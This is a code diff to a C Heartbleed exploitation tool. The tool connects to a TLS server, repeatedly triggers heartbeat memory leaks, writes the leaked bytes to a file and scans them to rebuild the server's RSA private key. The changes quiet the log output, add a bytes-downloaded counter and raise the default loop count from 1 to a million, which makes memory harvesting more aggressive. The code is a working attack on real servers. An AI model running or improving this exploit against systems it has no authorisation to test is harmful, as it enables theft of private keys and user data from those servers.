@@ -99,6 +99,7 @@ struct DumpArgs {
     unsigned ip_ver;
     unsigned port;
     size_t byte_count;
+    unsigned long long total_bytes;
     BIGNUM n;
     BIGNUM e;
     unsigned char buf[70000];
@@ -180,7 +181,7 @@ dump_bytes(int write_p, int version, int content_type,
     case 256: /* ???? why this? */
         return;
     case SSL3_RT_ALERT: /* 21 */
-        ERROR_MSG("[-] ALERT\n");
+        DEBUG_MSG("[-] ALERT\n");
         args->is_alert = 1;
         return;
     case TLS1_RT_HEARTBEAT:
@@ -369,6 +370,7 @@ find_private_key(const BIGNUM *n, const BIGNUM *e, const unsigned char *buf, siz
             RSA *rsa;
             BIO *out = BIO_new(BIO_s_file());
 
+            fprintf(stderr, "\n");
             BIO_set_fp(out,stdout,BIO_NOCLOSE);
 
             rsa = rsa_gen(&p, &dv, e);
@@ -396,10 +398,13 @@ process_bleed(struct DumpArgs *args)
 
     if (args->byte_count == 0)
         return;
+    args->total_bytes += args->byte_count;
 
-    x = fwrite(args->buf, 1, args->byte_count, args->fp);
-    if (x != args->byte_count) {
-        ERROR_MSG("[-] %s: %s\n", args->filename, strerror(errno));
+    if (args->fp) {
+        x = fwrite(args->buf, 1, args->byte_count, args->fp);
+        if (x != args->byte_count) {
+            ERROR_MSG("[-] %s: %s\n", args->filename, strerror(errno));
+        }
     }
 
     if (args->is_auto_pwn) {
@@ -467,7 +472,8 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
     size_t total_bytes = 0;
     char port[6];
     time_t started;
-    
+    time_t last_status = 0;
+
     /*
      * Open the file if it exists
      */
@@ -508,7 +514,7 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
      * select the first IPv4 or IPv6 address with the -v option.
      */
     snprintf(port, sizeof(port), "%u", args->port);
-    fprintf(stderr, "[ ] resolving \"%s\"\n", hostname);
+    DEBUG_MSG("[ ] resolving \"%s\"\n", hostname);
     x =  getaddrinfo(hostname, "443", 0, &addr);
     if (x != 0) {
         return ERROR_MSG("[-] %s: DNS lookup failed\n", hostname);
@@ -516,9 +522,9 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
         struct addrinfo *a;
         for (a=addr; a; a = a->ai_next) {
             my_inet_ntop(a->ai_family, a->ai_addr, address, sizeof(address));
-            fprintf(stderr, "[+]  %s\n", address);
+            DEBUG_MSG("[+]  %s\n", address);
         }
-        printf("\n");
+        DEBUG_MSG("\n");
     }
     while (addr && args->ip_ver == 4 && addr->ai_family != AF_INET)
         addr = addr->ai_next;
@@ -543,14 +549,14 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
      * Do a normal TCP connect to the target IP address, sending a SYN and
      * so on
      */
-    fprintf(stderr, "[ ] %s: connecting...\n", address);
+    DEBUG_MSG("[ ] %s: connecting...\n", address);
     x = connect(fd, addr->ai_addr, (int)addr->ai_addrlen);
     if (x != 0) {
         ERROR_MSG("%s: connect failed err=%d\n", address, WSAGetLastError());
         sleep(1);
         return 0;
     }
-    fprintf(stderr, "[+] %s: connected\n", address);
+    DEBUG_MSG("[+] %s: connected\n", address);
 
     
     
@@ -648,6 +654,14 @@ again:
     if (args->loop_count-- == 0) {
         ERROR_MSG("[-] loop-count = 0\n");
         goto end;
+    }
+
+    /*
+     * Print how many bytes we've downloaded on command-line
+     */
+    if (last_status + 1 <= time(0)) {
+        fprintf(stderr, "%llu bytes downloaded\r", args->total_bytes);
+        last_status = time(0);
     }
 
     /*
@@ -883,7 +897,7 @@ main(int argc, char *argv[])
 
     memset(&args, 0, sizeof(args));
     args.port = 443;
-    args.loop_count = 1;
+    args.loop_count = 1000000;
 
     if (argc <= 1 ) {
 usage:
